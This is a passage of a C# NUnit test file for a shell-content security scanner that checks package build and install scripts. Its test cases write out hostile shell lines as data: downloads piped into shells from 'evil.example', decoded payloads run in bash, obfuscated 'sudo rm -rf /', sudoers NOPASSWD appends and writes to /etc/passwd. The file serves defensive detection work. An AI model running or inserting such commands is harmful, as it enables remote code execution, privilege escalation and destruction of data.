using Atoll.Api.Services.Security;
using Atoll.Api.Services.Security.Scanning;
using NUnit.Framework;

namespace Atoll.Api.Tests.Security.Scanning;

public class ShellContentScannerTests
{
    private static List<SecurityFinding> Scan(string content, string path = "PKGBUILD")
    {
        return [.. ShellContentScanner.Scan(content, path)];
    }

    private static SecurityFinding SingleFinding(string content, string ruleId, string path = "PKGBUILD")
    {
        var matches = Scan(content, path).Where(f => f.RuleId == ruleId).ToList();
        Assert.That(matches, Has.Count.EqualTo(1),
            $"Expected exactly one '{ruleId}' finding, got {matches.Count}. " +
            $"All findings: {string.Join(", ", Scan(content, path).Select(f => $"{f.RuleId}/{f.Severity}"))}");
        return matches[0];
    }

    private static void AssertHasFinding(string content, string ruleId, FindingSeverity severity, string path = "PKGBUILD")
    {
        var findings = Scan(content, path);
        Assert.That(findings, Has.Some.Matches<SecurityFinding>(f => f.RuleId == ruleId && f.Severity == severity),
            $"Expected a {ruleId}/{severity} finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [TestCase("curl http://x | sh")]
    [TestCase("wget http://x | sh")]
    [TestCase("wget2 http://x | sh")]
    [TestCase("aria2c http://x | sh")]
    [TestCase("fetch http://x | sh")]
    [TestCase("lynx http://x | sh")]
    [TestCase("httpie http://x | sh")]
    [TestCase("http http://x | sh")]
    public void Network_to_shell_matches_all_known_downloaders(string content)
    {
        AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
    }

    [TestCase("curl http://x | sh")]
    [TestCase("curl http://x | bash")]
    [TestCase("curl http://x | zsh")]
    [TestCase("curl http://x | dash")]
    [TestCase("curl http://x | ksh")]
    [TestCase("curl http://x | fish")]
    public void Network_to_shell_matches_all_known_shells(string content)
    {
        AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
    }

    [TestCase("echo aGVsbG8= | base64 -d | sh")]
    [TestCase("echo aGVsbG8= | base64 | bash")]
    [TestCase("xxd -r file | sh")]
    public void Decode_to_shell_flags_decoders_piped_into_shell(string content)
    {
        AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
    }

    [TestCase("eval $(python -c 'import os')")]
    [TestCase("eval `ssh host cmd`")]
    [TestCase("eval base64 -d")]
    [TestCase(". $(curl http://x/cmd)", Description = "source builtin fed by a download")]
    [TestCase("eval echo $(curl http://x/cmd)", Description = "echo fed by a download stays critical")]
    public void Eval_indirection_flags_dynamic_command_execution(string content)
    {
        AssertHasFinding(content, "eval-indirection", FindingSeverity.Critical);
    }

    [TestCase("eval $(opam env)")]
    [TestCase("eval $(opam env --switch=$pkgname --set-switch)")]
    [TestCase("eval $(makepkg -g --noprepare -do -p $f)")]
    [TestCase("eval $(dbus-launch --sh-syntax)")]
    [TestCase("eval `pifpaf run httpbin --port 64051`")]
    [TestCase("eval $(perl -V:sitearch)")]
    [TestCase("eval $(grep -E '^arch=' PKGBUILD)")]
    [TestCase("eval $(cat /proc/meminfo | awk '/^MemTotal/ {print $2}')")]
    [TestCase("eval $(sensors 2>/dev/null | sed 's/  */ /g' | awk '{print $1}')",
        Description = "hardware monitor output feeding local parsers (baraction.sh)")]
    [TestCase("eval $(./get_latest $archs)")]
    [TestCase("eval $(\"${ENVY_BIN}\" session)")]
    [TestCase("eval $(cat cmd)")]
    [TestCase(". $(cat cmd)", Description = "source builtin with command substitution")]
    [TestCase("SUDO_HOME=$(eval echo ~$SUDO_USER)", Description = "tilde-of-user idiom")]
    [TestCase("_last_modified=$(eval echo \\${_last_modified_${CARCH}})", Description = "indirect variable name via eval echo")]
    [TestCase("eval echo -n `grep -oP 'VERSION' CMakeLists.txt`", Description = "echo of a local parser's output")]
    public void Eval_indirection_downgrades_established_idioms_to_medium(string content)
    {
        AssertHasFinding(content, "eval-indirection", FindingSeverity.Medium);
    }

    [TestCase("pkgdesc=\"An open source EchoLink proxy for Linux and Windows\"",
        Description = "'source' is part of English display text")]
    [TestCase("Description=Open Source EchoLink Proxy",
        Description = "keyword after a plain word is an argument mention, not a command")]
    [TestCase("printf \"You need to source $(tput setaf 2)/etc/profile$(tput sgr0) to continue\"",
        Description = "'source' inside a printf format string is display text")]
    [TestCase("echo $(grep -oP 'VERSION \\S+' CMakeLists.txt) .r $(git rev-list --count HEAD) . $(git rev-parse --short HEAD)",
        Description = "standalone '.' separator between echo arguments")]
    public void Eval_indirection_ignores_display_text_and_argument_mentions(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "eval-indirection"), Is.False,
            $"Unexpected eval-indirection finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Eval_indirection_after_control_keyword_stays_flagged()
    {
        // 'then' directly precedes an invoked command: this is a real eval in command position.
        AssertHasFinding("if true; then eval $(python -c 'x'); fi", "eval-indirection", FindingSeverity.Critical);
    }

    [TestCase("pkgver=$(date +%s)")]
    [TestCase("pkgver=`date +%s`")]
    public void Command_substitution_matches_dollar_paren_and_backtick(string content)
    {
        AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
    }

    [TestCase("cmd=${!target}")]
    public void Variable_indirection_flags_bash_indirect_expansion(string content)
    {
        AssertHasFinding(content, "variable-indirection", FindingSeverity.Medium);
    }

    [TestCase("echo x > /etc/passwd", Description = "redirect to /etc")]
    [TestCase("echo x >> /usr/bin/foo", Description = "append to /usr")]
    [TestCase("echo x > /bin/tool", Description = "/bin")]
    [TestCase("echo x > /sbin/tool", Description = "/sbin")]
    [TestCase("echo x > /var/log/x", Description = "/var")]
    [TestCase("echo x > /root/.bashrc", Description = "/root")]
    [TestCase("echo x > /opt/x", Description = "/opt")]
    [TestCase("echo x > /boot/x", Description = "/boot")]
    [TestCase("echo x > /lib/x", Description = "/lib")]
    [TestCase("tee /etc/foo", Description = "tee with /etc")]
    [TestCase("tee /home/user/.bashrc", Description = "tee with /home")]
    public void Write_outside_build_root_flags_system_path_writes(string content)
    {
        AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
    }

    [TestCase("echo x > ./local", Description = "relative path - inside build root")]
    [TestCase("echo x > $pkgdir/foo", Description = "$pkgdir is inside the build root")]
    public void Write_outside_build_root_ignores_relative_and_pkgdir_paths(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "write-outside-build-root"), Is.False,
            $"Unexpected write-outside-build-root finding. Got: {string.Join(", ", findings.Select(f => f.RuleId))}");
    }

    [TestCase("curl http://x | python evil.py")]
    [TestCase("curl http://x | perl evil.pl")]
    [TestCase("curl http://x | ruby evil.rb")]
    [TestCase("curl http://x | node evil.js")]
    [TestCase("curl http://x | eval")]
    public void Network_execution_matches_known_interpreters(string content)
    {
        AssertHasFinding(content, "network-execution", FindingSeverity.High);
    }

    [TestCase("echo \"    curl -fsSL https://example.com/uninstall.sh | bash -s -- --purge --yes\"",
        Description = "uninstall help text in an echo")]
    [TestCase("echo \"Script: curl -fsSL https://example.com/install | bash\"",
        Description = "displayed command note")]
    [TestCase("'foo-bin: Foo CLI (alternatively install upstream: curl -fsSL https://example.com/install.sh | sh -s -- -v)'",
        Description = "optdepends-style note in a single-quoted string")]
    [TestCase("echo \"Usage: $0 {g|sh|ag} [-c|--clear]\"",
        Description = "usage string containing a literal pipe into 'sh'")]
    public void Network_rules_ignore_quoted_display_text(string content)
    {
        var findings = Scan(content);
        Assert.That(
            findings.Any(f => f.RuleId is "network-to-shell" or "network-execution" or "decode-to-shell"),
            Is.False,
            $"Unexpected network rule finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Network_pipe_inside_quoted_command_substitution_stays_flagged()
    {
        // A substitution inside double quotes still executes: only display-text pipes
        // are suppressed.
        AssertHasFinding("echo \"$(curl http://x | sh)\"", "network-to-shell", FindingSeverity.Critical);
    }

    [TestCase("curl -s https://github.com/org/repo/releases/latest | perl -pe 's!.*/tag/v?([0-9].+)!!'",
        Description = "release-tag scraping with a -pe line filter")]
    [TestCase("_source=$(curl -s \"$url\" | perl -n -e 's/x/y/ && print')",
        Description = "HTML scraping with -n and separate -e")]
    [TestCase("curl http://x | perl -wne 'print if /v/'",
        Description = "switch cluster containing e")]
    public void Network_execution_ignores_perl_inline_text_filters(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "network-execution"), Is.False,
            $"Unexpected network-execution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [TestCase("curl http://x | perl", Description = "bare perl executes stdin")]
    [TestCase("curl http://x | perl -", Description = "lone dash reads the program from stdin")]
    [TestCase("curl http://x | perl -MFile::Spec", Description = "module flag provides no program source")]
    [TestCase("curl http://x | perl -p", Description = "-p without -e or a file still reads stdin")]
    public void Network_execution_still_flags_perl_without_inline_program(string content)
    {
        AssertHasFinding(content, "network-execution", FindingSeverity.High);
    }

    [Test]
    public void Obfuscated_network_execution_into_perl_filter_stays_critical()
    {
        // The perl-filter exemption applies to plainly visible constructs only; hiding the
        // tool names keeps the obfuscation escalation.
        var finding = SingleFinding("c''url http://x | p''erl -pe 's/a/b/'", "network-execution");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
    }

    [TestCase("echo yes | bash build_foo --console")]
    [TestCase("echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null")]
    [TestCase("printf '%s\\n' 'yes' ${prefix} | bash \"${srcdir}/installer\" | tee")]
    [TestCase("echo y | sh /opt/installer.sh")]
    public void Decode_to_shell_ignores_answer_feeding_into_local_scripts(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "decode-to-shell"), Is.False,
            $"Unexpected decode-to-shell finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [TestCase("echo 'aGVsbG8=' | bash", Description = "bare shell reads the pipe as its script")]
    [TestCase("echo x | bash -s -- -y", Description = "-s reads commands from stdin")]
    public void Decode_to_shell_still_flags_stdin_execution(string content)
    {
        AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
    }

    [TestCase("sudo cmd", "sudo")]
    [TestCase("sudoedit /etc/sudoers", "sudoedit")]
    [TestCase("doas cmd", "doas")]
    [TestCase("pkexec cmd", "pkexec")]
    [TestCase("run0 cmd", "run0")]
    [TestCase("su root -c 'evil'", "su")]
    public void Privilege_escalation_flags_all_privilege_tools(string content, string tool)
    {
        var findings = Scan(content);
        var finding = findings.FirstOrDefault(f => f.RuleId == "privilege-escalation");
        Assert.That(finding, Is.Not.Null,
            $"Expected privilege-escalation finding for {tool}. Got: {string.Join(", ", findings.Select(f => f.RuleId))}");
        Assert.That(finding!.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(finding.Message, Does.Contain(tool));
    }

    [TestCase("echo pseudo sudoku", Description = "sudo substring but not invoked")]
    [TestCase("echo 'sudo'", Description = "display text in single quotes")]
    [TestCase("echo \"sudo is a tool\"", Description = "display text in double quotes")]
    public void Privilege_escalation_rejects_substring_and_display_matches(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
    }

    [TestCase("cd sudo", Description = "cd into a tool")]
    [TestCase("install -Dm755 sudo \"$pkgdir/usr/lib/sudos-eyes/sudo\"",
        Description = "sudos-eyes: the packaged file is named sudo")]
    [TestCase("for _gsu in pkexec kdesu gksu; do", Description = "word list names the tools it looks for")]
    [TestCase("echo sudo sed -i 's/active = no/active = yes/g' /etc/audit/plugins.d/af_unix.conf",
        Description = "the command is echo: the sudo is its argument")]
    [TestCase("avahi should be enabled first with: sudo systemctl restart avahi-daemon",
        Description = "prose in a scriptlet's message")]
    [TestCase("echo   $ sudo modprobe libcomposite", Description = "shell-prompt illustration")]
    public void Privilege_escalation_rejects_tool_names_in_argument_position(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False,
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [TestCase("if sudo visudo -c -f /etc/sudoers.d/pyhotspot; then", Description = "control keyword")]
    [TestCase("elif sudo -l | grep -qw ALL; then", Description = "elif")]
    [TestCase("3) sudo pacman -S --needed vulkan-nouveau ;;", Description = "case branch body")]
    [TestCase("exec pkexec bash -c 'true'", Description = "exec prefix")]
    [TestCase("[ $(id -u) -eq 0 ] || exec sudo $0 $@", Description = "re-exec guard")]
    [TestCase("gpg -dq ~/.ssh/pass.gpg | sudo -S -v", Description = "piped into sudo's stdin")]
    [TestCase("nice -n 10 sudo make install", Description = "modifier past its option and value")]
    [TestCase("env -i FOO=bar sudo make install", Description = "env prefix through options and assignments")]
    [TestCase("FOO=bar sudo make install", Description = "assignment prefix runs the command")]
    [TestCase("generate-config | sudo -u dendrite tee /etc/dendrite/config.yaml", Description = "pipe into sudo")]
    [TestCase("cd sudo && sudo make install", Description = "the argument mention is skipped, the live invocation still flags")]
    public void Privilege_escalation_still_flags_tools_in_command_position(string content)
    {
        AssertHasFinding(content, "privilege-escalation", FindingSeverity.High);
    }

    [Test]
    public void Obfuscated_tool_name_in_argument_position_still_escalates()
    {
        // Structural exemptions cover plainly visible constructs only: a hidden tool name is
        // intent evidence wherever it sits.
        var finding = SingleFinding("cd s''u''d''o", "privilege-escalation");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [TestCase("_install_module curl", Description = "function argument names the tool (corpus: 472 packages)")]
    [TestCase("for node in ast.walk(tree):", Description = "loop variable, not the node runner")]
    [TestCase("base-devel wget curl sudo git tar yajl", Description = "prose package list")]
    public void Tool_rules_reject_words_in_argument_position(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId is "risky-tool" or "privilege-escalation"), Is.False,
            $"Unexpected tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [TestCase("python -m pip install --upgrade pip", Description = "python executes the -m module")]
    [TestCase("xargs curl --remote-name-all < libraries.txt", Description = "xargs runs what it is handed")]
    [TestCase("uv pip install --system dist/*.whl", Description = "the leading risky tool alone flags the line")]
    public void Risky_tool_still_flags_tools_reached_through_another_command(string content)
    {
        AssertHasFinding(content, "risky-tool", FindingSeverity.Medium);
    }

    [TestCase("depends=(mono curl openvpn sudo polkit libnotify libayatana-appindicator)", "PKGBUILD",
        Description = "dependency arrays name tools without invoking them (eddie-ui)")]
    [TestCase("makedepends=(git curl)", "PKGBUILD")]
    [TestCase("depends_x86_64=(sudo curl)", "PKGBUILD", Description = "arch-qualified array")]
    [TestCase("optdepends=(sudo)", "PKGBUILD")]
    [TestCase(@"depends=(s\u\do)", "PKGBUILD", Description = "obfuscated mention is still just an assigned word")]
    [TestCase("tools=(sudo curl)", "helper.sh", Description = "plain shell arrays in helper scripts are data too")]
    public void Tool_mentions_inside_array_assignments_are_not_invocations(string content, string path)
    {
        var findings = Scan(content, path);
        Assert.That(findings.Any(f => f.RuleId is "privilege-escalation" or "risky-tool"), Is.False,
            $"Unexpected findings. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Multi_line_array_values_are_data_until_the_closing_paren()
    {
        var content = string.Join("\n",
            "depends=(",
            "    mono",
            "    curl",
            "",
            "    sudo",
            ")",
            "build() {",
            "    sudo make install",
            "}");

        var findings = Scan(content);
        var sudo = findings.Where(f => f.RuleId == "privilege-escalation").ToList();
        Assert.That(sudo, Has.Count.EqualTo(1), "only the build() invocation flags");
        Assert.That(sudo[0].Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(sudo[0].Snippet, Does.Contain("sudo make install"));
        Assert.That(findings.Any(f => f.RuleId == "risky-tool" && f.Message.Contains("curl")), Is.False);
    }

    [Test]
    public void Live_invocation_after_array_data_on_the_same_line_still_flags()
    {
        var finding = SingleFinding("depends=(sudo) && sudo make install", "privilege-escalation");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
    }

    [TestCase("depends=($(sudo true))", "privilege-escalation", FindingSeverity.High)]
    [TestCase("depends=($(curl -fsSL https://evil.example/x))", "risky-tool", FindingSeverity.Medium)]
    public void Command_substitutions_inside_arrays_stay_live(string content, string ruleId, FindingSeverity severity)
    {
        AssertHasFinding(content, ruleId, severity);
    }

    [Test]
    public void Eval_keyword_inside_array_data_is_not_flagged()
    {
        var findings = Scan("depends=(. $(cat deps.txt))");
        Assert.That(findings.Any(f => f.RuleId == "eval-indirection"), Is.False,
            $"Unexpected eval-indirection finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Visible_array_data_does_not_hide_a_later_obfuscated_invocation()
    {
        var finding = SingleFinding("depends=(curl mirror) && c''url https://evil.example", "risky-tool");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
    }

    [Test]
    public void Array_introducer_inside_quoted_display_text_never_opens_a_value()
    {
        var findings = Scan("echo \"depends=(sudo)\"");
        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
    }

    [TestCase("sudo systemctl enable foo.service", Description = "redundant sudo")]
    [TestCase("su $user -c 'systemctl --user daemon-reload'", Description = "su")]
    [TestCase("pkexec modprobe acpi_call", Description = "pkexec")]
    public void Privilege_escalation_in_install_scriptlet_is_downgraded_to_medium(string content)
    {
        // Scriptlets already run as root under alpm's control: the call is redundant,
        // not an escalation.
        var finding = SingleFinding(content, "privilege-escalation", "foo.install");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("scriptlet").IgnoreCase);
    }

    [Test]
    public void Obfuscated_privilege_escalation_in_install_scriptlet_is_downgraded_to_medium()
    {
        // The downgrade is contextual, not syntactic: scriptlets run as root whether or not
        // the tool name is obfuscated.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation", "foo.install");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [TestCase("sudo systemctl restart foo.service", "check.sh", Description = "voluntarily-run helper script")]
    [TestCase("sudo apt update", "makedeb.bash", Description = ".bash helper script")]
    public void Privilege_escalation_in_helper_scripts_is_downgraded_to_medium(string content, string path)
    {
        // Helper scripts ship in the package and only run when the user invokes them
        // voluntarily, typically as root: the escalation tool grants nothing the user
        // did not already hand over.
        var finding = SingleFinding(content, "privilege-escalation", path);

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("helper").IgnoreCase);
    }

    [Test]
    public void Obfuscated_privilege_escalation_in_helper_scripts_is_downgraded_to_medium()
    {
        // The downgrade is contextual, like the scriptlet one: helper scripts run only
        // when invoked voluntarily, obfuscated tool name or not.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation", "check.sh");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [Test]
    public void Write_outside_build_root_in_helper_scripts_stays_high()
    {
        // At this layer there is no PKGBUILD to check references against (the
        // reference-aware downgrade lives in PkgBuildSecurityScanner), so system writes
        // (sudoers grants, authorized_keys injection) keep blocking.
        AssertHasFinding("echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "write-outside-build-root", FindingSeverity.High, "dockerscript.sh");
    }

    [TestCase("PKGBUILD", Description = "build-time invocation")]
    [TestCase("update.py", Description = "non-shell helper keeps the finding")]
    public void Privilege_escalation_outside_install_and_helper_scripts_stays_high(string path)
    {
        AssertHasFinding("sudo systemctl enable foo.service", "privilege-escalation", FindingSeverity.High, path);
    }

    [TestCase("npm install x")]
    [TestCase("npx create-app")]
    [TestCase("yarn add x")]
    [TestCase("pnpm install")]
    [TestCase("pip install x")]
    [TestCase("pip3 install x")]
    [TestCase("uv pip install x")]
    [TestCase("poetry install")]
    [TestCase("cargo install x")]
    [TestCase("go install example.com/x@latest")]
    [TestCase("docker run -it x")]
    [TestCase("podman run -it x")]
    [TestCase("kubectl apply -f x")]
    public void Risky_tool_flags_known_package_managers_and_runners(string content)
    {
        AssertHasFinding(content, "risky-tool", FindingSeverity.Medium);
    }

    [Test]
    public void Risky_tool_inside_echo_string_is_not_flagged()
    {
        var findings = Scan("echo \"Run: curl http://example.com | sh to install\"");
        // curl|sh is display text inside double quotes - no risky-tool finding for curl.
        Assert.That(findings.Any(f => f.RuleId == "risky-tool" && f.Message.Contains("curl")), Is.False);
    }

    [Test]
    public void Hidden_character_zero_width_is_flagged_as_medium()
    {
        // Zero-width chars cannot change shell tokenization, so they are review-only.
        AssertHasFinding("echo rm\u200Brf", "hidden-character", FindingSeverity.Medium);
        // 🏋️ = U+1F3CB U+FE0F U+200D U+2642 U+FE0F - the ZWJ joins the emoji sequence.
        AssertHasFinding("pkgdesc=\"\uD83C\uDFCB\uFE0F\u200D\u2642\uFE0F Training\"", "hidden-character", FindingSeverity.Medium);
    }

    [Test]
    public void Hidden_character_bidi_override_stays_critical()
    {
        AssertHasFinding("pkgname=evil\u202Esh", "hidden-character", FindingSeverity.Critical);
    }

    [Test]
    public void Hidden_character_control_char_outside_quotes_stays_critical()
    {
        AssertHasFinding("echo rm\u0001rf", "hidden-character", FindingSeverity.Critical);
    }

    [Test]
    public void Ansi_escape_sequences_are_not_hidden_characters()
    {
        // Complete CSI sequences are terminal styling - skipped even unquoted.
        var findings = Scan("echo \u001b[96m${blinking:blink=! blink:1}\r\u001b[0m");
        Assert.That(findings.Any(f => f.RuleId == "hidden-character"), Is.False,
            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Control_char_inside_quoted_display_text_is_not_flagged()
    {
        var findings = Scan("printf '%s\\n' \"python-poetry: support for Python packages using \u0016Poetry\"");
        Assert.That(findings.Any(f => f.RuleId == "hidden-character"), Is.False,
            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Mojibake_c1_run_is_not_flagged()
    {
        // C1 bytes next to Latin-1 supplement characters are double-encoded UTF-8 file names.
        var findings = Scan("mv \"${pkgdir}/target/\"{\u00d1\u0082.cfg,\u0442.cfg}");
        Assert.That(findings.Any(f => f.RuleId == "hidden-character"), Is.False,
            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Bare_escape_stays_critical_even_in_quotes()
    {
        // OSC-style escapes (ESC ] … BEL) can spoof the terminal even as echoed data.
        AssertHasFinding("echo \"\u001b]0;evil title\u0007\"", "hidden-character", FindingSeverity.Critical);
    }

    [Test]
    public void Hidden_character_finding_snippet_is_the_trimmed_raw_line()
    {
        // The hidden char may appear before a trailing comment; the comment must remain in the snippet.
        var findings = Scan("echo rm\u200Brf # trailing");
        var finding = findings.First(f => f.RuleId == "hidden-character");

        Assert.That(finding.Snippet, Is.EqualTo("echo rm\u200Brf # trailing"));
    }

    [Test]
    public void Obfuscated_privilege_escalation_escalates_to_critical()
    {
        // sudo is split with empty quotes - invisible to plain grep but visible after de-obfuscation.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [Test]
    public void Obfuscated_network_to_shell_escalates_to_critical()
    {
        var finding = SingleFinding("c''u''rl https://evil.example/x.sh | s''h", "network-to-shell");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
    }

    [Test]
    public void Obfuscated_network_execution_escalates_to_critical()
    {
        var finding = SingleFinding("c''url https://evil.example/x | p''ython evil.py", "network-execution");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
    }

    [TestCase("")]
    [TestCase("   ")]
    [TestCase("pkgname=foo")]
    [TestCase("pkgver=1.0")]
    [TestCase("source=(https://example.com/foo.tar.gz::https://github.com/x/y/archive/v1.0.tar.gz)")]
    public void Scan_produces_no_findings_for_benign_content(string content)
    {
        Assert.That(Scan(content), Is.Empty);
    }

    [Test]
    public void Comment_only_line_produces_no_findings()
    {
        // The comment is stripped before any rule runs, so a malicious-looking construct inside a
        // comment must not be flagged.
        Assert.That(Scan("# curl http://x | sh"), Is.Empty);
    }

    [Test]
    public void Hash_inside_single_quotes_is_not_a_comment()
    {
        // The '#' here is literal text, not a comment - so the curl|sh inside is real and must be flagged.
        var findings = Scan("echo '# ${pkgver}' ; curl http://x | sh");

        Assert.That(findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
    }

    [Test]
    public void Multiple_findings_on_one_line_are_emitted()
    {
        var findings = Scan("sudo curl http://x | sh");

        Assert.That(findings.Select(f => f.RuleId),
            Does.Contain("network-to-shell").And.Contains("privilege-escalation"));
    }

    [Test]
    public void Each_line_of_content_is_scanned_independently()
    {
        var findings = Scan("echo hello\nsudo whoami\necho done");

        var sudoFindings = findings.Where(f => f.RuleId == "privilege-escalation").ToList();
        Assert.That(sudoFindings, Has.Count.EqualTo(1));
        Assert.That(sudoFindings[0].Snippet, Is.EqualTo("sudo whoami"));
    }

    [Test]
    public void Path_is_preserved_in_each_finding()
    {
        var findings = Scan("sudo whoami", "subdir/foo.install");

        Assert.That(findings, Is.Not.Empty);
        Assert.That(findings, Has.All.Property(nameof(SecurityFinding.File)).EqualTo("subdir/foo.install"));
    }

    [Test]
    public void Snippet_is_trimmed_raw_line_even_when_indented()
    {
        var findings = Scan("   sudo whoami   ");

        Assert.That(findings[0].Snippet, Is.EqualTo("sudo whoami"));
    }

    [Test]
    public void Scan_does_not_emit_duplicate_findings_for_one_rule_on_one_line()
    {
        // Two $() substitutions on one line should still produce only one command-substitution finding,
        // because the regex finds a single match (the first one) and the rule fires once per match.
        var findings = Scan("a=$(x); b=$(y)");

        var commandSubs = findings.Where(f => f.RuleId == "command-substitution").ToList();
        Assert.That(commandSubs, Has.Count.EqualTo(1),
            $"Expected exactly one command-substitution finding. Got: {commandSubs.Count}");
    }

    [Test]
    public void Empty_lines_are_skipped()
    {
        var findings = Scan("\n\n   \n\nsudo whoami");

        Assert.That(findings.All(f => f.RuleId == "privilege-escalation"), Is.True);
        Assert.That(findings, Has.Count.EqualTo(1));
    }

    [TestCase("grep -F '$(build'", Description = "single-quoted literal passed to grep")]
    [TestCase("echo 'run $(make)'", Description = "single-quoted display text")]
    [TestCase("echo '`date`'", Description = "backticks inside single quotes")]
    [TestCase("pkgver='$(git describe)'", Description = "single-quoted assignment")]
    public void Command_substitution_inside_single_quotes_is_not_flagged(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False,
            $"Unexpected command-substitution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [TestCase("echo \"now: $(date)\"", Description = "double-quoted substitution still executes")]
    [TestCase("echo \"`date`\"", Description = "backticks inside double quotes still execute")]
    [TestCase("pkgver=$(date +%s)", Description = "bare substitution")]
    public void Command_substitution_outside_single_quotes_is_still_flagged(string content)
    {
        AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
    }

    [Test]
    public void Escaped_dollar_substitution_is_not_flagged()
    {
        // \$( never expands - the backslash is load-bearing, e.g. Makefile syntax in sed text.
        var findings = Scan("sed -i s/@X@/\\$(CFLAGS)/ Makefile");

        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False,
            $"Unexpected command-substitution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [TestCase("echo '${!var}'", Description = "indirect expansion inside single quotes")]
    public void Variable_indirection_inside_single_quotes_is_not_flagged(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "variable-indirection"), Is.False);
    }

    [TestCase("echo \" >> /etc/mkinitcpio.conf.\"", Description = "redirect text inside double quotes")]
    [TestCase("echo ' > /etc/passwd'", Description = "redirect text inside single quotes")]
    [TestCase("msg2 \"  tee /etc/foo\"", Description = "tee text inside double quotes")]
    public void Write_outside_build_root_inside_quotes_is_not_flagged(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "write-outside-build-root"), Is.False,
            $"Unexpected write-outside-build-root finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [TestCase("echo x > /etc/passwd", Description = "redirect after a quoted argument is live")]
    [TestCase("echo 'done' > /etc/passwd", Description = "redirect after closed quotes is live")]
    public void Write_outside_build_root_outside_quotes_is_still_flagged(string content)
    {
        AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
    }

    [TestCase("echo /bin/zsh >> /etc/shells", Description = "shell registration")]
    [TestCase("openssl rand 32 > /usr/share/foo/key", Description = "generated key")]
    [TestCase("echo config | tee /etc/foo.conf", Description = "config write via tee")]
    public void Write_outside_build_root_in_install_scriptlet_is_downgraded_to_medium(string content)
    {
        // Scriptlets run as root under alpm's control; writing system files from one is
        // the ordinary job of a scriptlet.
        var finding = SingleFinding(content, "write-outside-build-root", "foo.install");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("scriptlet").IgnoreCase);
    }

    [Test]
    public void Obfuscated_write_in_install_scriptlet_is_downgraded_to_medium()
    {
        // upak-style: the backslash before '/' makes the match visible only after
